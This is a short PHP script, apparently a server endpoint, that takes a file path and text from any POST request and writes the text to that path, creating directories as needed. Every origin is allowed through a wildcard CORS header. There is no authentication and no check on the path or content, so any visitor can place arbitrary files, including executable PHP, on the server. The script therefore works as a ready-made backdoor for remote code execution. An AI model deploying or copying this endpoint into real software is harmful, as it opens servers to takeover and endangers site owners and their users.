<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['path']) && isset($_POST['text'])) {
    // Retrieve the file path and text from the POST request
    $path = $_POST['path'];
    $text = $_POST['text'];

    // Ensure the directory exists or create it
    $directory = dirname($path);
    if (!is_dir($directory) && !mkdir($directory, 0755, true)) {
        echo "Error: Unable to create directory.";
        exit;
    }

    // Save the text to the file
    if (file_put_contents($path, $text) !== false) {
        echo "File created successfully: " . htmlspecialchars($path);
    } else {
        echo "Error: Unable to write to the file.";
    }
} else {
    echo "Invalid request. Please send 'path' and 'text' via POST.";
}
?>
